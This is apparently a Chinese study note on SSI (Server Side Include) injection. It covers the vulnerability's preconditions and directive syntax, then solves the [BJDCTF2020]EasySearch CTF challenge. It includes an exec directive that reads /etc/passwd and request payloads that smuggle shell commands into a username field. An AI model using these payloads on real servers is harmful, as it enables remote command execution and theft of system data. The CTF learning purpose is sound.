## ssi漏洞学习

SSI--Server Side Include，服务端包含漏洞

漏洞原理：在HTML文件当中，通过注释来调用命令，达到注入或远程执行任意代码

## 前提

攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功：

1. Web服务器支持并开启了SSI；
2. Web应用程序在返回HTML页面时，嵌入了用户输入的内容；
3. 外部输入的参数值未进行有效的过滤；



在存在有XSS漏洞的地方一般都会存在SSI注入漏洞的

### SSI基本语法

+ 显示服务器环境变量--`<#echo>`
  + 文档名称`<!--#echo var="DOCUMENT_NAME"-->`
  + 现在时间`<!--#echo var="DATE_LOCAL"-->`
  + 显示ip地址`<!--#echo var="REMOTE_ADDR"-->`
+ 将文本内容插入到文档当中`<#include>`
  + `<!--#include file="文件名"-->`
  + `<!--#include virtual="index.html"-->`
  + `<!--#include virtual="文件名"-->`
  + `<!--#inlcude virtual="/www/footer/.html"-->`
+ 显示web文档的相关信息`<#flastmod><#fsize>`
  + `<!--#flastmod file="文件名"-->`
  + `<!--#fsize file="文件名"-->`
+ 直接执行服务器的程序`<#exec>`
  + `<!--#exec cmd="文件名"-->`
  + `<!--#exec cmd="cat /etc/passwd"-->`
  + `<!--#exec cgi="文件名"-->`
  + `<!--#exec cgi="/cgi-bin/access_log.cgi"-->`

## 例题

### [BJDCTF2020]EasySearch

题目存在源码泄露

![image-20210811211012914](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811211012914.png)

可以看到这个只要md5加密之后截取前六位等于6d0bc1就可以了

![image-20210811211130799](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811211130799.png)

利用一个python脚本来跑一下看看有什么

```python
import hashlib

for i in range(100000000):
    a = hashlib.md5(str(i).encode("utf-8")).hexdigest()

    if a[0:6] == '6d0bc1':
        print(i)
#2020666
#2305004
#9162671
#51302775
```

在请求头那里有个地址，访问看看

![image-20210811211653708](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811211653708.png)

发现显示了我的ip还有时间出来

![image-20210811211818446](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811211818446.png)

再看回源码 发现他将我们传入的username参数写进了s.shtml当中，这样就造成了SSI注入漏洞了

```
username=<!--#exec cmd="ls"-->&password=2305004
```

![image-20210811212407967](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811212407967.png)

的确可以执行命令

找一下flag在哪

```
username=<!--#exec cmd="find / -name fl*"-->&password=2305004
```

![image-20210811212750457](https://lamcheukwing.oss-cn-shenzhen.aliyuncs.com/img/image-20210811212750457.png)

直接访问就能拿到flag了